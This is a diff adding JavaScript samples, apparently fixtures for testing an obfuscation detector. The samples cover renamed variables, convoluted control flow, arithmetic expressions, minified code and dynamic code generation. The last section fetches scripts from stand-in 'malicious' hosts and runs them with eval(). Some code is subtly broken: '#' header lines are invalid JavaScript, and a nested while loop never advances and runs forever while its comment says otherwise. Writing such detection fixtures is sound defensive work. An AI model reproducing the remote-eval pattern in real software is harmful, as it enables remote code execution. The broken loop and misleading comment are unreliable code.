@@ -61,3 +61,170 @@ if (false) {
 
 // More code execution
 console.log("This part of the code is active.");
+
+
+# TEST CODE FOR VARIABLE NAME OBFUSCATION
+
+// Variables with descriptive names
+var databaseUrl = "https://database.example.com";
+var apiKey = "abcdef123456";
+var timeoutDuration = 3000;
+
+// Variables with obfuscated names
+var jdfhjdhf = "This is an obfuscated string.";
+var lkjsdf = 56789;
+var qwero = [100, 200, 300, 400, 500];
+var zxcvbn = "Another example of obfuscated text.";
+var asdfgh = ["Alpha", "Beta", "Gamma"];
+
+// Function that uses both types of variables
+function showConnectionDetails() {
+    console.log("Database URL: " + databaseUrl);
+    console.log("API Key: " + apiKey);
+    console.log("Timeout Duration: " + timeoutDuration);
+}
+
+// Function with obfuscated names
+function processObfuscatedData() {
+    console.log(jdfhjdhf);  // Using obfuscated variable
+    console.log(lkjsdf);  // Using obfuscated variable
+    console.log("Number List: " + qwero.join(", "));  // Using obfuscated variable
+    console.log(zxcvbn);  // Using obfuscated variable
+    console.log("Elements: " + asdfgh.join(", "));  // Using obfuscated variable
+}
+
+// Execute functions
+showConnectionDetails();
+processObfuscatedData();
+
+
+
+# TEST CODE FOR CONTROL FLOW OBFUSCATION / SPAGUETTI CODE
+
+// Complex nested conditionals
+if (true) {
+    if (false) {
+        console.log("This will never execute.");
+    } else {
+        if (true) {
+            console.log("This will always execute.");
+            if (Math.random() > 0.5) {
+                console.log("Random condition met.");
+            } else {
+                console.log("Random condition not met.");
+            }
+        }
+    }
+}
+
+// Nested loops with unnecessary complexity
+for (var i = 0; i < 5; i++) {
+    while (i < 3) {
+        for (var j = 0; j < 2; j++) {
+            console.log("Nested loop iteration: i = " + i + ", j = " + j);
+            if (j === 1) {
+                break; // Breaks inner loop only
+            }
+        }
+        if (i === 2) {
+            continue; // Continues outer loop
+        }
+    }
+}
+
+// Unusual use of break and continue
+function processNumbers() {
+    for (var i = 0; i < 10; i++) {
+        if (i === 5) {
+            break; // Exits the loop
+        }
+        if (i % 2 === 0) {
+            continue; // Skips the iteration
+        }
+        console.log("Processing number: " + i);
+    }
+}
+
+processNumbers();
+
+// Unnecessary use of goto-like logic using labels (simulated with JavaScript)
+var label = "start";
+outer_loop:
+for (var i = 0; i < 3; i++) {
+    console.log("Outer loop iteration: " + i);
+    inner_loop:
+    for (var j = 0; j < 3; j++) {
+        if (i === 1 && j === 1) {
+            break outer_loop; // Exits outer loop
+        }
+        console.log("  Inner loop iteration: " + j);
+    }
+}
+
+// More complex control flow with nested functions
+function outerFunction() {
+    function innerFunction() {
+        for (var k = 0; k < 3; k++) {
+            if (k === 2) {
+                return; // Exits inner function
+            }
+            console.log("Inner function iteration: " + k);
+        }
+    }
+    innerFunction();
+}
+
+outerFunction();
+
+# TEST CODE FOR ARITHMETIC OBFUSCATION
+
+// Variables with arithmetic obfuscation
+var x = 5 * (2 + 3) - 8; // 5 * 5 - 8 = 17
+var y = (12 / (2 + 1)) + (7 - 3); // 12 / 3 + 4 = 8
+var z = ((4 * 3) + 6) / (2 + 1); // 18 / 3 = 6
+var a = (9 + 15) * (8 - 4) / 2; // 24 * 4 / 2 = 48
+var b = ((10 + 5) * 3) - (8 / 2); // 45 - 4 = 41
+
+// Complex arithmetic expressions
+var result1 = ((x * 2) - y) + (z / 3); // (17 * 2) - 8 + 6 / 3 = 34 - 8 + 2 = 28
+var result2 = (a + b) * ((y / 2) - (z / 3)); // (48 + 41) * (8 / 2 - 6 / 3) = 89 * (4 - 2) = 178
+
+// Using variables
+console.log("Result x:", x); // Should print: 17
+console.log("Result y:", y); // Should print: 8
+console.log("Result z:", z); // Should print: 6
+console.log("Result a:", a); // Should print: 48
+console.log("Result b:", b); // Should print: 41
+console.log("Result result1:", result1); // Should print: 28
+console.log("Result result2:", result2); // Should print: 178
+
+
+// TEST CODE FOR MINIFICATION
+
+var a=1,b=2,c=3;function add(x,y){return x+y}console.log(add(a,b)+c);
+
+
+// TEST CODE FOR DYNAMIC CODE GENERATION
+
+// Example of using eval to execute dynamically generated code
+var code = "console.log('Hello, world!');";
+eval(code);
+
+// Example of using Function constructor to create and execute code
+var dynamicFunction = new Function("a", "b", "return a + b;");
+console.log(dynamicFunction(5, 10));
+
+// Example of fetching code from a URL
+fetch("http://malicious.example.com/script.js")
+    .then(response => response.text())
+    .then(script => eval(script));
+
+// Example of XMLHttpRequest to get code
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "http://another-malicious.example.com/code.js", true);
+xhr.onreadystatechange = function() {
+    if (xhr.readyState === 4 && xhr.status === 200) {
+        eval(xhr.responseText);
+    }
+};
+xhr.send();
